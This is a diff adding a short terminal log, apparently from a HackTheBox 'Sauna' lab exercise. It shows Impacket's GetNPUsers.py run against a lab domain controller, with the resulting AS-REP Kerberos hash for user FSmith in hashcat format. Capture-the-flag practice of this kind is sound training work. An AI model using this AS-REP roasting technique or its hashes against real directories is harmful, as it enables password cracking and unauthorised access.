@@ -1,0 +1,8 @@
+user@kali:~/hackthebox/hackthebox/sauna$ /home/user/Downloads/impacket/build/scripts-2.7/GetNPUsers.py -format hashcat -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/FSmith
+/usr/local/lib/python2.7/dist-packages/cryptography/__init__.py:39: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.
+  CryptographyDeprecationWarning,
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Cannot authenticate FSmith, getting its TGT
+$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:319b5f62666df4e8f27e73fbbfee9565$98ebfdb6674b47c90f531201c866616341a2ba3ac73e97bf2564459134f1eea8290ff66eb5f0941855c9107e746fa52fc5c4c9429f586187ef2bff5c18f4351b32162b1857b73bd2fcaefe2205bf4ad40108c9f3bfc0e06d8ee8bcb33982eb2c35029483edc9acc7b993135874a2bb4e1237ca79496516ba0ff4e6d8529fd7be1904655563a11774686c0ab0a861c099b66c4a0066cfd5517a5b455576f67cc7a685408e57f49588fd062e5d54a64c8aba2f1f44a119397328c61a7360eef5d84850e619b3faa1f1a1f0bbb1cfdd691f7ecb76f5f2c0fb3e869d8072162c7e21fad046fb7e753425ab7e809b951c5a784c66245d5ecab4684ed4471ac55ebe86
